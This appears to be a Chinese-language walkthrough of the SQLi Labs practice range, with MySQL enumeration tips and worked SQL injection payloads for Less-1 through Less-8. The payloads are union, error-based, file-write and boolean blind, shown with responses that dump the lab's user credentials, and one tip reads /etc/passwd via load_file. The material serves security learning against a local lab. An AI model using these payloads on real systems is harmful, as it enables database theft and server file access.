---
title: "SQLi Labs"
weight: 3
bookToc: true
---

## 环境

使用Docker快速搭建`SQLi Labs`靶场环境，[https://github.com/Audi-1/sqli-labs](https://github.com/Audi-1/sqli-labs)
```bash
docker run -dt --name sqli-lab -p 50080:80 acgpiano/sqli-labs:latest
```

部署完后访问[http://localhost:50080/](http://localhost:50080/)，数据库初始操作点击一下`Setup/reset Database for labs`

## Tips
### information_schema

`information_schema`是mysql自带的一个数据库，包含了各种原数据，可以获取以下信息

获取所有databases
```sql
select group_concat(schema_name) from information_schema.schemata
```

获取当前database
```sql
select database()
```

获取当前数据库的所有表tables
```sql
select group_concat(table_name) from information_schema.tables where 
table_schema = database()
```

获取某个表的所有columns
```sql
select group_concat(column_name) from information_schema.columns where 
table_schema = database() and table_name = 'users'
```

获取某个表中的数据
```sql
select group_concat(id,':',username,':',password) from users
```

### 注释

3种注释风格：
- `#`: 后面直接加内容，如`#this is a comment`
- `--`: 后面必须要加空格，如`-- this is a comment`，urlencode会将`+`替换为空格
- `/**/`:  中间可以跨行，如`/*this is a comment*/`

注释的目的是：在输入数据改变了原有sql执行的情况下，能够正确闭合sql语句

### 文件操作
读文件
```sql
select load_file('/etc/passwd')
```

写文件
```sql
select * from user into outfile '/tmp/zqqtest'
```

DUAL为虚拟表，为了补齐语法结构

limit 0,1 或 limit 1 offset 0 取第一条 

### 优先级

AND OR 优先级，[And has precedence over Or](https://stackoverflow.com/questions/1241142/sql-logic-operator-precedence-and-and-or)

### 报错
当`extractvalue/updatexml`这两个函数在执行时，如果出现xml文档路径错误就会产生报错
```sql
select 1 and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))));

select 1 and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3));
```

以下`Less`的目的是获取当前数据库`user`表中的数据

## Page-1 (Basic Challenges)

### Less-1 GET - Error based - Single quotes - String

这里的`Error based`的含义是页面会有报错提示，让你知道是如何闭合的；搭配`union select`获取的数据
```
Less-1/?id=-1'
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''-1'' LIMIT 0,1' at line 1

Less-1/?id=-1' order by 3 -- +
Less-1/?id=-1' order by 4 -- +
Unknown column '4' in 'order clause'

Less-1/?id=-1' union select 1,2,3 -- +
Welcome    Dhakkan
Your Login name:2
Your Password:3

Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database() -- +
Welcome    Dhakkan
Your Login name:emails,referers,uagents,users
Your Password:3

Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = database() and table_name = 'users' -- +
Welcome    Dhakkan
Your Login name:id,username,password
Your Password:3

Less-1/?id=-1' union select 1,group_concat(id,':',username,':',password,'<br>'),3 from users -- +
Welcome    Dhakkan
Your Login name:1:Dumb:Dumb
,2:Angelina:I-kill-you
,3:Dummy:p@ssword
,4:secure:crappy
,5:stupid:stupidity
,6:superman:genious
,7:batman:mob!le
,8:admin:admin
,9:admin1:admin1
,10:admin2:admin2
,11:admin3:admin3
,12:dhakkan:dumbo
,14:admin4:admin4

Your Password:3
```

### Less-2 GET - Error based - Integer based

```
Less-2/?id=1'
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1

Less-2/?id=-1 order by 3 -- +
Less-2/?id=-1 order by 4 -- +
Unknown column '4' in 'order clause'

Less-2/?id=-1 union select 1,2,3 -- +
Welcome    Dhakkan
Your Login name:2
Your Password:3

其余同上
```

### Less-3 GET - Error based - Single quotes with twist - string

```
Less-3/?id=1'
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1

Less-3/?id=-1') union select 1,2,3 -- +
Welcome    Dhakkan
Your Login name:2
Your Password:3

其余同上
```

### Less-4 GET - Error based - Double quotes - String

```
Less-4/?id=1"
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1

Less-4/?id=-1") union select 1,2,3 -- +
Welcome    Dhakkan
Your Login name:2
Your Password:3
```

### Less-5 GET - Double injection - Single quotes - String

这里的`Double inject`是指`Double Query Injection`，指的是类似下面的语句
```sql
select 
    count(*),
    concat((select database()), floor(rand() * 2)) as x        
from users 
group by x;
```
会触发`Duplicate entry for key 'group_key'`报错，并搭配报错信息带出额外数据

所以暂不考虑其他方法

```
Less-5/?id=1'
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

Less-5/?id=-1' union select 1,2,3 -- +
Welcome    Dhakkan
You are in...........

# 数据库名
Less-5/?id=1' union select 1,count(*),concat((select database()),floor(rand(0)*2))as a from information_schema.tables group by a --+

# 表名
Less-5/?id=1' union select count(*),2,(concat((select concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)))as x from information_schema.tables group by x -- +
Welcome    Dhakkan
Subquery returns more than 1 row

Less-5/?id=0' union select count(*),2,(concat((select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2)))as x from information_schema.tables group by x -- +
Welcome    Dhakkan
Duplicate entry 'emails1' for key 'group_key'

Less-5/?id=0' union select count(*),2,(concat((select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2)))as x from information_schema.tables group by x -- +
Welcome    Dhakkan
Duplicate entry 'referers1' for key 'group_key'

Less-5/?id=0' union select count(*),2,(concat((select concat(table_name) from information_schema.tables where table_schema=database() limit 2,1),floor(rand(0)*2)))as x from information_schema.tables group by x -- +
Welcome    Dhakkan
Duplicate entry 'uagents1' for key 'group_key'

Less-5/?id=0' union select count(*),2,(concat((select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),floor(rand(0)*2)))as x from information_schema.tables group by x -- +
Duplicate entry 'users1' for key 'group_key'

# 列名
?id=0' union select count(*),2,(concat((select concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1),floor(rand(0)*2)))as x from information_schema.tables group by x -- +
Welcome    Dhakkan
Duplicate entry 'id1' for key 'group_key'

?id=0' union select count(*),2,(concat((select concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'users' limit 1,1),floor(rand(0)*2)))as x from information_schema.tables group by x -- +
Welcome    Dhakkan
Duplicate entry 'username1' for key 'group_key'

?id=0' union select count(*),2,(concat((select concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'users' limit 2,1),floor(rand(0)*2)))as x from information_schema.tables group by x -- +
Welcome    Dhakkan
Duplicate entry 'password1' for key 'group_key'

# 数据
?id=0' union select count(*),2,(concat((select concat(id,':',username,':',password) from users limit 0,1),floor(rand(0)*2)))as x from information_schema.tables group by x -- +
Welcome    Dhakkan
Duplicate entry '1:Dumb:Dumb1' for key 'group_key'

# 其余数据略
```

### Less-6 GET - Double injection - Double quotes - String

```
Less-6/?id=1"
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"" LIMIT 0,1' at line 1

# 数据库名
Less-6/?id=1" union select 1,count(*),concat((select database()),floor(rand(0)*2))as a from information_schema.tables group by a --+
Welcome    Dhakkan
Duplicate entry 'security1' for key 'group_key'

# 其余同上
```

### Less-7 GET - Dump into file - String

此题需要先进入容器`chmod -R 777 /var/www/html`，不然会报权限问题，`secure_file_priv`权限是没问题的
```
ERROR 1 (HY000): Can't create/write to file '/var/www/html/test.txt' (Errcode: 13)
```

```
Less-7/?id=1'
Welcome    Dhakkan
You have an error in your SQL syntax

Less-7/?id=1')) --+
Welcome    Dhakkan
You are in.... Use outfile......

Less-7/?id=1')) order by 4 --+
Welcome    Dhakkan
You have an error in your SQL syntax

Less-7/?id=-1')) union select 1,2,database() into outfile  '/var/www/html/test.txt' --+
Welcome    Dhakkan
You have an error in your SQL syntax

http://localhost:50080/test.txt
1	2	security

# 其他略
```

### Less-8 GET - Blind - Boolean Based - Double Quotes

```
Less-8/?id=1' --+
Welcome    Dhakkan
You are in...........

# 数据库名
Less-8/?id=1' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) = 115 --+
Welcome    Dhakkan
You are in...........

Less-8/?id=1' AND ASCII(SUBSTRING((SELECT database()), 8, 1)) = 121 --+
Welcome    Dhakkan
You are in...........

# 表名
Less-8/?id=1' AND ASCII(SUBSTRING((SELECT group_concat(table_name) from information_schema.tables where table_schema=database()), 1, 1)) = 101 --+
Welcome    Dhakkan
You are in...........

# 列名
Less-8/?id=1' AND ASCII(SUBSTRING((SELECT group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'), 1 , 1)) = 105 --+
Welcome    Dhakkan
You are in...........

# 数据
Less-8/?id=1' AND ASCII(SUBSTRING((SELECT concat(id,':',username,':',password) from users limit 0,1), 1, 1)) = 49 --+
Welcome    Dhakkan
You are in...........
```

需要搭配`Burp Suite`使用
![](/data/image/web-blind-burp.jpg)

## Page-2 (Advanced Injections)

## Page-3 (Stacked Injections)

## Page-4 (Challenges)